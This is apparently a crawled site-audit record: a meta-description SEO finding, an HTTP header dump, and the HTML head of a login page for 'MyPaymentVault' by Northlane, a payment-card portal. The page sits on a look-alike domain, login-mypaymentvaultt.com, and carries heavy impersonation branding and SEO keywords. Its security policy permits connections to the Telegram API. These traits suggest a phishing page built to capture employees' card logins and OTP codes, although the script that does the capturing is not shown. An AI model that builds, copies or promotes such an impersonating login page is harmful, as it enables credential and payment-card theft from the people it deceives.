@@ -1,0 +1,132 @@
+
+Meta Description too long or too short
+- 1 instance found
+How to fix?
+What is the issue about?
+Search engine crawlers only show the first 150-160 characters of the description in the search results page, so if a description is too long, searchers may not see all of the text. If a description is too short, the search engines may add text found elsewhere on the page. Note that search engines may show a different description from the one you have authored if they feel it may be more relevant to a user's search.
+How to fix?
+Change the description in the <meta description> tag in the page source to be between 25 and 160 characters in length.
+1/1
+Content-Encoding : br
+
+Content-Type : text/html; charset=UTF-8
+
+Last-Modified : Tue, 02 Dec 2025 19:28:30 GMT
+
+Accept-Ranges : bytes
+
+Cache-Control : public, max-age=0
+
+Content-Security-Policy : default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https: blob:; font-src 'self' https://fonts.gstatic.com data:; connect-src 'self' https://api.resend.com https://api.telegram.org; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
+
+cross-origin-embedder-policy : require-corp
+
+cross-origin-opener-policy : same-origin
+
+cross-origin-resource-policy : same-origin
+
+Date : Mon, 08 Dec 2025 22:48:15 GMT
+
+ETag : W/"10eb-19ae089ab30"
+
+frame-options : DENY
+
+permissions-policy : geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), picture-in-picture=(), screen-wake-lock=(), web-share=()
+
+Referrer-Policy : no-referrer
+
+Server : Google
+
+Server : Frontend
+
+Strict-Transport-Security : max-age=63072000; includeSubDomains
+
+Strict-Transport-Security : max-age=31536000; includeSubDomains; preload
+
+Vary : Accept-Encoding
+
+x-ai-crawl : disallow
+
+x-ai-index : noindex
+
+x-ai-training : disallow
+
+x-content-protection : Active
+
+X-Content-Type-Options : nosniff
+
+x-dmca-protection : Enabled
+
+X-Frame-Options : DENY
+
+x-permitted-cross-domain-policies : none
+
+X-Powered-By : Express
+
+X-XSS-Protection : 1; mode=block
+
+Via : 1.1 google
+
+Alt-Svc : h3=":443"; ma=2592000
+
+Alt-Svc : h3-29=":443"; ma=2592000
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#000000">
+    
+    <!-- Primary Meta Tags -->
+    <meta name="title" content="Login MyPaymentVault | Northlane">
+    <meta name="description" content="Login to MyPaymentVault powered by Northlane. Secure employee payment portal with multi-factor authentication, OTP verification & card management. Access your account 24/7.">
+    <meta name="keywords" content="login mypaymentvault, mypaymentvault northlane, northlane login, mypaymentvault login, login northlane, northlane mypaymentvault login, my payment vault northlane, northlane payment vault, employee payment portal northlane, secure payment login, mypaymentvault card login, northlane card authentication, payment vault access northlane, mypaymentvault account login, northlane employee portal, royal caribbean mypaymentvault, wirecard login alternative, northlane secure login, multi factor authentication login, mypaymentvault otp login, northlane payment gateway, employee card portal northlane, mypaymentvault sign in, northlane cardholder login, payment processing northlane, mypaymentvault portal access, northlane vault login, secure employee payment northlane, mypaymentvault 24/7 access">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="language" content="English, Spanish, French">
+    <meta name="author" content="MyPaymentVault - Northlane">
+    <meta name="publisher" content="Northlane">
+    <meta name="revisit-after" content="1 days">
+    <meta name="distribution" content="global">
+    <meta name="rating" content="general">
+    <meta name="geo.region" content="US">
+    <meta name="geo.placename" content="United States">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://login-mypaymentvaultt.com/">
+    <meta property="og:title" content="Login MyPaymentVault | Northlane">
+    <meta property="og:description" content="Secure employee payment portal powered by Northlane. Login to MyPaymentVault with multi-factor authentication, manage your payment card, and access your account anytime, anywhere.">
+    <meta property="og:image" content="https://login-mypaymentvaultt.com/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="MyPaymentVault Northlane Login Portal - Secure Payment Authentication">
+    <meta property="og:site_name" content="MyPaymentVault - Northlane">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:locale:alternate" content="es_ES">
+    <meta property="og:locale:alternate" content="fr_FR">
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://login-mypaymentvaultt.com/">
+    <meta name="twitter:title" content="Login MyPaymentVault | Northlane">
+    <meta name="twitter:description" content="Secure login to MyPaymentVault by Northlane. Multi-factor authentication, OTP verification & 24/7 payment card access for employees.">
+    <meta name="twitter:image" content="https://login-mypaymentvaultt.com/og-image.png">
+    <meta name="twitter:image:alt" content="MyPaymentVault Northlane - Secure Payment Login Portal">
+    <meta name="twitter:creator" content="@MyPaymentVault">
+    <meta name="twitter:site" content="@Northlane">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://play-lh.googleusercontent.com/9D_BHKQ6yhld7YzMxjs8gHuQ1DI5Zl2LJhOZ1IGQnC7xPM-AoDsAFpx-8rQiOHYWQw=w240-h480">
+    <link rel="canonical" href="https://login-mypaymentvaultt.com/">
+    
+    <title>Login MyPaymentVault | Northlane</title>
+    <script type="module" crossorigin src="/assets/index-3PQjun1k.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-DwRrRDTD.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  </body>
+</html>
